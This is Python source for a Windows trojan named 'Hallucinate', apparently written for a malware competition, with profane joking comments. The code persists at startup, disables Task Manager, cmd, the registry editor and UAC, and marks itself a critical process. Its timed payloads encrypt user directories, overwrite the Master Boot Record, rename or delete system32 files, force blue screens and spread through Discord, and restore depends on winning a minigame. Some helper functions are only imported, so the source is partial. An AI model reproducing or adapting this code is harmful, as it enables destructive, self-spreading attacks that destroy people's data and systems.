from win32gui import *
from win32ui import *
from win32con import *
from win32api import *
from win32print import *
from win32file import *
from file_utils import *
import keyboard
import sys
import math
from time import time as seconds
from threading import _start_new_thread as thread
from random import randrange, choice
from threading import Thread
from yogotgamesonyaphone import run_game_main

def run_payload():
    screen_x = GetSystemMetrics(0)
    progman = FindWindow("progman", None) #progman OMAGAD
    shell = FindWindowEx(progman, None, "shelldll_defview", None)
    hwndListView = FindWindowEx(shell, None, "syslistview32", None)
    speed = 0
    start_time = seconds()
    icon_width = 76  # Man if you use anything else you're a fucking weirdo anyways
    while 1:
        icon_positions = GetDesktopIconPositions()
        nIcons = len(icon_positions)

        for i in range(nIcons):
            item_x, item_y = icon_positions[i]
            desired_x = item_x + icon_width
            if desired_x >= screen_x:
                ListView_SetItemPosition(hwndListView, i, 0, item_y)
                icon_positions[i][0] = 0
            else:
                ListView_SetItemPosition(hwndListView, i, desired_x, item_y)
                icon_positions[i][0] = desired_x
        speed = int(seconds() - start_time) * 20 * 2
        if speed > 995:
            speed = 995
        Sleep(1000 - speed)
def idiv(x, y):
    if not y: return 0
    return x / y
def PointTowards(pointA, pointB):
    ax, ay = pointA
    bx, by = pointB
    steps_number = max( abs(bx-ax), abs(by-ay) )

    stepx = float(bx-ax) / steps_number
    stepy = float(by-ay) / steps_number
    return int(ax + stepx*76), int(ay + stepy*98)
def FixIconPos(x, y):
    return math.floor(x / 76) * 76, math.floor(y / 98) * 98
def TrashbinChase():
    speed = 0
    start_time = seconds()
    prevent_taskbar = AntiTaskbar()
    prevent_taskbar.run()
    while 1:
        icon1 = GetDesktopIconPositions()[0]
        x1, y1 = FixIconPos(*icon1)
        x2, y2 = FixIconPos(*GetCursorPos())
        # SetDesktopIconPosition
        if (x1, y1) == (x2, y2):
            prevent_taskbar.terminate()
            return False
        x,y = PointTowards((x1, y1), (x2, y2))
        SetDesktopIconPosition(0, x, y)
        speed = int(seconds() - start_time) * 20
        if speed > 1100:
            prevent_taskbar.terminate()
            return True
        if speed>995:
            speed = 995
        Sleep(1000-speed)
def DropReward():
    # Find out for yourself loser...
    pass

def TrashbinPayload():
    if TrashbinChase():
        DropReward()
    else:
        BSOD()
def Payload1():
    if randrange(2) == 1:
        TrashbinPayload()
    else:
        run_payload() # so creative function name 🤪

def DiscordPayload():
    try:DiscordSpreadingRoutine()
    except Exception as e:
        print("Spreading failed:", e)

def Watcher():
    thread( WatchDog.MMC             , ())
    thread( WatchDog.ProcessExplorer , ())
    thread( WatchDog.ProcessHacker   , ())
def PrinterPayload():
    printers = ["r", "r,", "r"]
    printer_message="""HELP ME!!!

I'm the printer and would like you to talk to Windows, because this is getting out of hand!!
It is continuously bugging me with silly questions like:
"Do you still have paper?!", "Can you print in color?", "I'd like to have this one in landscape mode!",
"Are you ready?"
I think you can agree with me that this cannot go on like this any longer.

Regards, your sympathetic, helpful friend, the printer.

STEN'S NOT DEAD

""" + (":)\n" * 100) # printer message
    def get_printers():
        all_printers = [printer[2] for printer in EnumPrinters(2)]
        printer_machines = []
        for printer in all_printers:
            if not (printer.startswith('OneNote ') or printer.startswith('Microsoft ') or printer=='Fax'):
                printer_machines.append(printer)
        return printer_machines
    printers = get_printers()
    for machine in printers:
        thead(PrintToPrinter, (machine, printer_message))


    if not printers:
        MessageBox("Maybe consider gettin a printer?", "Ain't got no cash?", MB_ICONASTERISK | MB_OK)
        MessageBox("Press OK when you have plugged in and turned on your printer.", "otherwise... something bad will happen :)", MB_ICONWARNING | MB_OK)
        
        printers = get_printers()
        if not printers:
            MessageBox("You did not listen to me, how dare you underestimate my power?!", "NoPrinterFound", MB_ICONERROR | MB_OK)
            MessageBox("You will now suffer...", "Ha", MB_ICONASTERISK | MB_OK)
            OverwriteMBR(printer_mbr)
            DestructiveShit()
        else:
            for machine in get_printers():
                thead(PrintToPrinter, (machine, printer_message))
def GenerateFileNameFunnyHaha():
    names = ['ur','your','u','Your','Youre']
    name = choice(names) + choice([' ', '_']) + choice(['machine', 'computer', 'system', 'laptop', '2012 laptop']) + choice([' ', '_']) + choice(['is', 'are']) + choice([' ', '_']) + choice(['very ', 'mega ', 'ultra ', 'super ', 'fucking ', '', '', '']) + choice(['ruined', 'shitted on', 'fucked', 'dead', 'doomed', 'itzstened', 'sub2itzsten']) + '_' + str(randrange(345934543))
    return name
def DestructiveShit():
    system32 = PATH.SYSTEM32
    win = PATH.WINDOWS_FOLDER
    patha = '\\'.join(os.environ['USERPROFILE'].split('\\')[:-1])
    Thread(target = Encryption.EncryptDirectory, args = (patha, 'hallucinations'), daemon=True).start()
    Sleep(3 * 60000) # did i ask?
    ForceRenameFile(system32 + 'cmd.exe', 'skripp kidie kunsul.exe') # XXDEEE XDEXE LMAQIEDA;F )#)¤)ADZKFKZ
    ForceRenameFile(win + "SysWOW64", "S"+choice(['y','u'])+"s"+choice(['sy',''])+"WOW69"+choice(['420','']))
    files = WalkDirectory(system32)
    for _ in range(randrange(90) + 10):
        file = choice(files)
        if file==system32 + 'skripp kidie kunsul.exe': continue
        extension = '.' + file.split('.')[-1]
        if randrange(3) == 1:
            try:DeleteFile(file)
            except:pass 
        else:
            ForceRenameFile(file, GenerateFileNameFunnyHaha() + extension)
    RedBSOD()

def EasterEggsMain():
    # bro...
    pass

def main():
    EasterEggsMain()
    drop()

    # rewrite / add registry keys that make my life better
    AddToStartup()
    DisableRegistry()
    DisableCMD()
    DisableTaskMgr()
    DisableControlPanel()
    DisableUAC()

    # adjust some ballin privileges
    AdjustCorrectPrivileges()
    SetCritical()

    # your moda.
    if IsRunningFirstTime():
        GetDaysAfterExecution()

    # watch for sussy processes
    Watcher()

    days = GetDaysAfterExecution() # wow so low level!!!

    if days >= 5 and days <= 10:
        # rand moment :trol:
        if randrange(3) == 1:
            Payload1()

    if days >= 20:
        # simple logic for kids!1
        if not DiscordPayloadRan():
            DiscordPayload()

    if days == 30:
        PrinterPayload()

    if days >= 40:
        # encrypt shit
        patha = '\\'.join(os.environ['USERPROFILE'].split('\\')[:-1])
        try:
            Encryption.EncryptDirectory(os.environ['USERPROFILE'] + '\\Desktop', 'hallucinations')
        except: pass
        Thread(target = Encryption.EncryptDirectory, args = (patha, 'hallucinations'), daemon=True).start()
        Sleep(3 * (60 * 1000)) # give it a few minutes (i'm stupid)

        # Hindi Best Tutorial Enable Command Prompt For Kids
        EnableCMD()
        os.system('taskkill /f /im explorer.exe')
        DisableCMD()

        sys32 = PATH.SYSTEM32
        win = PATH.WINDOWS_FOLDER

        # prevent enderman from making shit go down lel
        ForceRenameFile(sys32 + 'LogonUI.exe', 'LolgonUI.exe')
        ForceRenameFile(win + 'SysWOW64', 'SysWOW69')
        ForceRenameFile(sys32 + 'WindowsPowerShell', 'WynnDoePower')
        ForceRenameFile(sys32 + 'cmd.exe', 'batch haxxor tool.exe')

        # Le Fishé Au Chocolat.
        HideEverything()

        # read previous mbr (max 4096 bytes)
        mbr_old = ReadMBR()

        # overvratt embier!!!11
        OverwriteMBR(fazbear_mbr)

        DisplayFazbearWarning()
        did_won = game_loop()

        # simple logic :)
        if not did_won:
            RedBSOD()
            sys.exit(0)

        # might look weird lol, this is what restores mbr
        OverwriteMBR(mbr_old)

        # restore sussy file names
        ForceRenameFile(sys32 + 'batch haxxor tool.exe', 'cmd.exe')
        ForceRenameFile(sys32 + 'LolgonUI.exe', 'LogonUI.exe')
        ForceRenameFile(win + 'SysWOW69', 'SysWOW64')
        ForceRenameFile(sys32 + 'WynnDoePower', 'WindowsPowerShell')

        # restore desktop
        EnableCMD()
        os.system('start explorer.exe')

        # congratulate the user that their machine almost died
        MessageBox("Congratulations! You have won the Fazbear minigame! Hallucinate will now recover all destroyed data, Master Boot Record, decrypt all files, and most importantly self destruct.\n\nPlease ensure your power cable is plugged in, if this process is aborted your machine will be destroyed- for a very long time if not forever!\n\nPress OK to start the reparation.", "Congratz!", MB_ICONASTERISK | MB_OK)
        
        # remove registry keys
        RemoveFromStartup()
        EnableTaskMgr()
        EnableRegistry()
        EnableControlPanel()
        EnableUAC()

        path = '\\'.join(os.environ['USERPROFILE'].split('\\')[:-1]) # we're redefining it, (enderman will always try to fuck it up :) )
        
        # TerminateThread momento
        thread(MessageBox, ("Please be patient while Hallucinate is decrypting your files, this may take a while!\n\nYou will recieve another message after the decryption process is complete.", "HallucinateDecryptor", MB_ICONASTERISK | MB_OK))
        
        # decrypt stuff
        Encryption.DecryptDirectory(path, 'hallucinations')

        # remove hallucinate directory
        DeleteHallucinateDirectory()

        # Remove process criticality from the process
        SetCritical(0)
        def OldMessageDestroyer(hWnd, lParam): # callback function to FUCKIN' DESTROY! the previous message
            try:
                buffering = PyMakeBuffer(255) # Create buffering
                length = SendMessage(hWnd, WM_GETTEXT, 255, buffering) # Get length
                result = str(buffering[0:length*2].tobytes().decode('utf-16')) # decode the string
                if result=="HallucinateDecryptor": # ik it's not the best method... whatever lmao
                    SendMessage(hWnd, WM_CLOSE, None, None) # close the window :)
            except:
                pass # if any ball torturing error was found, ignore it like it never was valued anything
        EnumChildWindows(GetDesktopWindow(), OldMessageDestroyer, None)
        MessageBox("Hallucinate has now successfully decrypted your data and repaired the system, Hallucinate will now remove itself from your computer. Goodbye, friend :')", "HallucinateDecryptor", MB_ICONASTERISK | MB_OK)
        sys.exit(0)
    while 1:
        time.sleep(1)

BGR = lambda r, g, b: RGB(b, g, r)
RGBA = lambda r, g, b, a: (a * 16777216) + (r * 65536) + (g * 256) + b
def RenewDC(dc, d=0):
    DeleteDC(dc)
    return GetDC(d)


def DisplayFazbearWarning():
    dc = GetDC(0)
    bBrush = CreateSolidBrush(RGB(0, 0, 0))
    SelectObject(dc, bBrush)
    Rectangle(dc, 0, 0, GetSystemMetrics(0), GetSystemMetrics(1))
    DeleteObject(bBrush)

    for i in range(200):
        dc = RenewDC(dc)
        DrawTextS(
            dc,
            "Your computer is a victim of the                  \nHallucinate trojan! Please do not\nrestart your machine, as your Master       \nBoot Record is overwritten, and all of        \nyour files are encrypted!                      \n                                                                      \nStay patient while the game is loading...",
            20, 350, 70, (255, 255, 255)
        )
        DrawTextS(dc, "ATTENTION!", 20, 20, 180, color=HUE(i*10), font = "Comic Sans MS")
    start_first = time.time()
    for i in range(2):
        start_time = time.time()
        i = 1
        while (time.time() - start_time) < 10:
            arr = GetEmptyNumpy()
            a = circle_only(arr, i*4, rotation = 0.01 * i)
            dc = RenewDC(dc)
            DrawNpArray(dc, a, start_first)
            del arr
            del a
            i += 1
        start_time = time.time()
        i = 1
        while (time.time() - start_time) < 10:
            arr = GetEmptyNumpy()
            a = xor_only(arr, i/50)
            dc = RenewDC(dc)
            DrawNpArray(dc, a, start_first)
            del arr
            del a
            i += 1
        start_time = time.time()
        i = 1
        while (time.time() - start_time) < 10:
            arr = GetEmptyNumpy()
            a = directional_only(arr, i*4, i / 50)
            dc = RenewDC(dc)
            DrawNpArray(dc, a, start_first)
            del arr
            del a
            i += 1
    DeleteDC(dc)

def game_loop():
    return run_game_main()

def actual_main():
    if IsRunningFirstTime():
        user_input = MessageBox("WARNING! You are about to execute a trojan malware, called Hallucinate. Made for the Enderman H Gang malware competition by Itzsten, this malware is only made for education (and entertaining, Mr. Enderman x] ) purposes. I am not responsible whatsoever for any damage caused using this software. Please understand these terms, and do not press yes if you do not have control over the situation and are a hundred procent sure you really want to destroy your system. \n\nIf you do not consent these terms, please press No to terminate the program. Otherwise, you may continue by pressing yes.", "Hallucinate, friend!", MB_YESNO | MB_ICONWARNING)
        if user_input != 6:
            print("[dbg] Exit on first warning")
            sys.exit(1)
        user_input = MessageBox("THIS IS THE LAST WARNING, PRESSING YES WILL RESULT IN IRREVERSIBLE DESTRUCTIVE CONSEQUENSES.\n\nARE YOU SURE YOU WANT TO CONTINUE, RESULTING IN AN UNUSABLE SYSTEM?!", "Hallucinate !LAST WARNING!", MB_YESNO | MB_ICONWARNING)
        if user_input != 6:
            print("[dbg] Exit on second warning")
            sys.exit(2)
    main()
actual_main()
